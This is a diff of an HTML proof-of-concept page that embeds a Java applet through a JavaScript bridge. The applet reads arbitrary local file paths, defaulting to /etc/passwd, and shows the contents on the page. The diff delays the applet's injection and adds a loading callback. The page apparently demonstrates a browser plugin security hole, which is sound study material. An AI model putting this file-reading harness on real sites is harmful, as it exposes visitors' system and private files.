@@ -4,6 +4,9 @@
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>
   <title>Digging out graves</title>
   <style>
+      #control{
+          display: none;
+      }
       #grave{
           position: absolute;
           left: -999px;
@@ -22,37 +25,39 @@
 <p>When you dig out ages old graves, be afraid, nay, very afraid of what you are going
 to dig out.</p>
 
-<p>
-<label for="file">Enter any local path:</label>
-<input type="text" value="/etc/passwd" id="file">
-<input type="submit" id="dig">
-</p>
-<textarea id="result">
-
-</textarea>
-
-  <applet
-   codebase="."
-   id="grave"
-   code="ch.gnegg.Zombie"
-   width="1"
-   height="1"
-   archive="grave.jar"
-   MAYSCRIPT
-  ></applet>
+<div id="ui">
+    <div id="loading">please wait while the grave is being dug...</div>
+    <div id="control">
+        <p>
+        <label for="file">Enter any local path:</label>
+        <input type="text" value="/etc/passwd" id="file">
+        <input type="submit" id="dig">
+        </p>
+        <textarea id="result"></textarea>
+    </div>
+</div>
 
 <script>
     window.caller = function(thisobj, arg, cb){
         cb.apply(thisobj || window, [arg]);
     };
-    $(window).load(function(){
+    window.grave_dug = function(){
+        $('#loading').hide();
+        $('#control').show();
         var grave = $('#grave')[0];
         $('#dig').click(function(){
             grave.dig($('#file').val(), null, function(file){
                 $('#result').val(file);
             });
         });
-    })
+    };
+    $(function(){
+        setTimeout(function(){
+            $('<applet codebase="." id="grave" code="ch.gnegg.Zombie" width="1" height="1" archive="grave.jar" MAYSCRIPT><param name="zombie_resurrected" value="grave_dug" /></applet>')
+              .appendTo('body');
+        }, 1000);
+    });
+
 </script>
 </body>
 </html>
